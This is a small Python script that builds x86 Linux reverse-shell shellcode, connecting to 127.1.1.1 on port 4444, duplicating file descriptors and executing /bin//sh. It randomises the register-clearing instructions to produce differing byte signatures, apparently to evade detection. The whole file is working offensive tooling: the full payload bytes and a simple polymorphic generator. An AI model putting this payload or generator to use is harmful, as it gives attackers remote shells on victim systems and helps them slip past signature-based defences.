import random
from _socket import htons


def main():
    #print(htons(127))
    #shellcode = "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    shellcode = random_eax_clear() + random_ebx_clear() + "\\xb0\\x66\\xb3\\x01" + random_edx_clear() + "\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x03\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80" + random_ecx_clear() + random_eax_clear() + "\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf0" + random_eax_clear() + "\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" + random_ecx_clear() + "\\xcd\\x80"
    print("Shellcode bytes size: %d" % (len(shellcode) / 4))
    print(shellcode)

def random_eax_clear():
    eax_clear_array = ["\\x31\\xc0", "\\x29\\xC0"]
    random_element = random.randrange(0, len(eax_clear_array))
    print("eax random:%d" % random_element)
    
    return eax_clear_array[random_element]


def random_ebx_clear():
    ebx_clear_array = ["\\x31\\xDB", "\\x29\\xDB"]
    random_element = random.randrange(0, len(ebx_clear_array))
    print("ebx random:%d" % random_element)

    return ebx_clear_array[random_element]

def random_ecx_clear():
    ecx_clear_array = ["\\x31\\xC9", "\\x29\\xC9"]
    random_element = random.randrange(0, len(ecx_clear_array))
    print("ecx random:%d" % random_element)

    return ecx_clear_array[random_element]

def random_edx_clear():
    edx_clear_array = ["\\x31\\xD2", "\\x29\\xD2"]
    random_element = random.randrange(0, len(edx_clear_array))
    print("edx random:%d" % random_element)

    return edx_clear_array[random_element]



if __name__ == '__main__':
    main()
